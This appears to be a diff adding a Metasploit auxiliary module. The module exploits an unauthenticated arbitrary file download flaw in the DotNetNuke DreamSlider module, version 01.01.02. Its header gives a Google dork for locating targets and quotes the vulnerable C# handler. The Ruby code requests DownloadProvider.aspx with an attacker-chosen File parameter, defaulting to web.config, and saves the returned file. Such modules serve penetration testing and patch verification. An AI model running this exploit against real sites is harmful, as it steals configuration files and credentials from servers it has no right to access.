@@ -1,0 +1,131 @@
+# Exploit Title: DotNetNuke DreamSlider Arbitrary File Download
+# Date: 23/01/2014
+# Author: Glafkos Charalambous
+# Version: 01.01.02
+# Vendor: DreamSlider
+# Vendor URL: http://www.dreamslider.com/
+# Google Dork: inurl:/DesktopModules/DreamSlider/
+# CVE: 
+#
+# Description
+# DotNetNuke DreamSlider Module prior to version X suffer from a remote unauthenticated arbitrary file download vulnerability
+#
+# Vulnerable Code
+#
+# namespace DotNetNuke.Modules.DreamSlider
+# {
+#    using System;
+#    using System.IO;
+#    using System.Web.SessionState;
+#    using System.Web.UI;
+#
+#    public class DownloadProvider : Page, IRequiresSessionState
+#    {
+#        protected void Page_Load(object sender, EventArgs e)
+#        {
+#            if (!base.IsPostBack && (base.Request.QueryString["File"] != null))
+#            {
+#                string path = base.Request.QueryString["File"];
+#                string fileName = Path.GetFileName(path);
+#                base.Response.ContentType = "application/octet-stream";
+#                base.Response.AddHeader("Content-Disposition", "attachment; filename=" + fileName);
+#                base.Response.WriteFile(path);
+#                base.Response.End();
+#            }
+#        }
+#    }
+# }
+
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Auxiliary
+  Rank = ExcellentRanking
+
+  include Msf::Auxiliary::Report
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => 'DotNetNuke DreamSlider Arbitrary File Download',
+      'Description'    => %q{
+        This module exploits an unauthenticated arbitrary file download vulnerability in DNN
+	DreamSlider version 01.01.02 and below.
+      },
+      'Author'         =>
+        [
+          'Glafkos Charalambous', # Discovery and Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'URL', 'http://metasploit.com' ]
+        ],
+      'DisclosureDate' => 'Mar 23 2015'))
+
+    register_options(
+      [
+        Opt::RPORT(80),
+        OptString.new('FILENAME', [true, 'File to download', '~/web.config']),
+        OptString.new('PATH', [true, 'Path of DNN Nuke', '/']),
+      ], self.class)
+  end
+
+  def check
+    begin
+
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri' => normalize_uri(datastore['PATH'],"/DesktopModules/DreamSlider/DownloadProvider.aspx"),
+        'cookie' => datastore['Cookie'],
+      })
+
+    if res && res.code == 200 and res.body.to_s =~ /Download Provider/
+       return Exploit::CheckCode::Vulnerable
+    else
+       return Exploit::CheckCode::Safe
+    end
+    Exploit::CheckCode::Safe
+   end
+  end
+
+  def run
+    begin
+      print_status("#{peer} - Downloading file #{datastore['FILENAME']}")
+
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri' => normalize_uri(datastore['PATH'],"/DesktopModules/DreamSlider/DownloadProvider.aspx?File=") + datastore['FILENAME'],
+	'cookie' => datastore['Cookie'],
+      })
+
+    rescue Rex::ConnectionError
+      print_error("#{peer} - Could not connect.")
+      return
+    end
+
+    if res && res.code == 200
+      if res.body.to_s.bytesize == 0
+        print_error("#{peer} - 0 bytes returned, file does not exist or it is empty.")
+        return
+      end
+
+      fileName = datastore['FILENAME']
+
+      path = store_loot(
+        'ds.http',
+        'application/octet-stream',
+        datastore['RHOST'],
+        res.body,
+        fileName
+      )
+      print_good("#{peer} - File saved in: #{path}")
+    else
+      print_error("#{peer} - Failed to download file.")
+    end
+  end
+end
